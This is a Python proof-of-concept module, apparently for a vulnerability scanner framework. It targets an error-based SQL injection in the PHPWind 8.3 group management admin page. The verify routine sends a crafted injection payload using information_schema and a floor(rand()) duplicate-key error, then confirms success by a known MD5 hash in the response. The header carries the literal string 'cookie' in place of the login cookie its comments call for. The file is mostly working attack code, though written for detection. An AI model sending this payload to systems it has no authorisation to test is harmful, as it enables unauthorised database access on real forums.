# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'PHPWind_0011_p'  # 平台漏洞编号，留空
    name = 'PHPWind 8.3 /apps/group/admin/manage.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2011-03-10'  # 漏洞公布时间
    desc = '''
        phpwind（简称：pw）是一个基于PHP和MySQL的开源社区程序，是国内最受欢迎的通用型论坛程序之一。
        利用前提是得到群组管理员权限，所以需要传入-c参数cookie
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPWind'  # 漏洞应用名称
    product_version = '8.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e725dfab-5425-4cd9-8bb5-4b1383f18fa3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # 属于验证后台漏洞，所以需要登录并且获取cookie，详情参考对应的PDF
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # this poc need to login, so special cookie for target must be included in http headers.
            cookie = ''
            header = {
                'cookie': 'cookie'
            }
            payload = ("/admin.php?adminjob=apps&admintype=groups_manage&action=argument&keyword=1" +
                       "&ttable=/**/tm ON t.tid=tm.tid LEFT JOIN pw_argument a ON t.tid=" +
                       "a.tid LEFT JOIN pw_colonys c ON a.cyid=c.id WHERE (SELECT 1 FROM (select count(*),concat" +
                       "(floor(rand(0)*2),CONCAT(0x3a,(SELECT md5(233))))a from information_schema.tables group by a)b)%23")
            verify_url = self.target + payload
            req = requests.get(verify_url, headers=header)

            if 'e165421110ba03099a1c0393373c5b43' in req.text:
                #args['success'] = True
                #args['poc_ret']['vul_url'] = verify_url
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
